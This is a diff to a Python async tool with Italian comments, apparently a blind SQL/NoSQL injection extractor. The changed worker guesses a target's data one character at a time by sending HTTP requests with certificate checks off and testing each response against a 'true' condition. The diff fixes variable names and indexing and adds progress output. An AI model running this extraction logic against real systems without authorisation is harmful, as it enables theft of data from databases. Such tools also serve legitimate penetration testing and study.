@@ -158,22 +158,25 @@ async def _extract_char_binary(
 # 4B. WORKER ED ESTRAZIONE PARALLELA - LINEARE
 # ==========================================
 
-async def _extract_char_linear(parsed_req, pos: int, charset: str, true_condition: dict, client: httpx.AsyncClient, semaphore: asyncio.Semaphore) -> str:
+async def _extract_char_linear(raw_template, pos: int, charset: str, true_condition: dict, client: httpx.AsyncClient, semaphore: asyncio.Semaphore) -> str:
     """
     Ricerca lineare per NoSQL o scenari senza operatori di confronto (> / <).
     {payload} viene sostituito direttamente col singolo carattere.
     """
+    # print(f'pos:{pos}  ', end='')
     for char in charset:
-        req_kwargs = prepare_httpx_request(parsed_req, pos, char)
-        
-        async with semaphore:
-            res_data = await send_single_request(
-                raw_template, pos=pos, payload_val=payload_val, client=client, semaphore=semaphore
-            )
-            
-        if evaluate_response(res, true_condition):
+        # print(char, end='', flush=True)
+        print('.', end='', flush=True)
+        # print(f'{pos} {char} req', flush=True)
+
+        res_data = await send_single_request(
+            raw_template, client=client, semaphore=semaphore, pos=pos, char=char
+        )
+        # print(f'{pos} {char} resp', flush=True)
+
+        if evaluate_response(res_data, true_condition):
             return char
-            
+
     return "?"
 
 async def extract_data(
@@ -189,7 +192,7 @@ async def extract_data(
     async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
         tasks = []
         
-        for pos in range(1, length + 1):
+        for pos in range(0, length):
             if strategy == "binary":
                 task = _extract_char_binary(parsed_req, pos, sorted(charset), true_condition, client, semaphore)
             else:
